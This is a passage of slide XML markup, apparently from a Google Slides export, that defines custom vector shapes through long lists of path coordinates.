                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4292" y="6750"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4219" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="7631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7521"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="6750"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1101" y="6127"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1358" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="8695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="6897"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="6494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="6127"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8731" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8474" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="331"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="5797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="6604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="7081"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3155" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="9135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="8805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="8548"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="8328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="5907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="4660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="3743"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="3486"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="2679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="2129"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="1542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="735"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="515"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="368"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="38"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1981" y="12399"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1981" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="12399"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1651" y="9391"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1688" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="12106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="12216"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="12656"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="12840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="13023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="13023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="12840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="12143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="11556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="11519"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="11996"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="12179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="12583"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="12473"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="12363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="10859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="11556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="10749"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="10052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="10162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="9391"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1541" y="8768"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1468" y="8805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="8915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="9025"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="9355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="11409"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="12253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="12913"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="13170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="13243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="13243"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="13280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="13390"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="13280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="13133"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="12840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="12693"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="12326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2862" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="11226"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1871" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="8805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="8768"/>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2" name="Google Shape;312;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6351100" y="3281600"/>
              <a:ext cx="366850" cy="361350"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="14674" h="14454" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="7887" y="3779"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7961" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="4513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="3779"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4329" y="5063"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4476" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="6126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="6237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="5063"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6604" y="7594"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6714" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="7594"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5283" y="8107"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5356" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="8107"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7337" y="9905"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7337" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="9905"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9721" y="9061"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9832" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="9061"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7667" y="9758"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7777" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="11189"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="10382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="9758"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10162" y="1321"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10198" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10932" y="3229"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10969" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8511" y="3816"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="3559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="3706"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5100" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="5063"/>
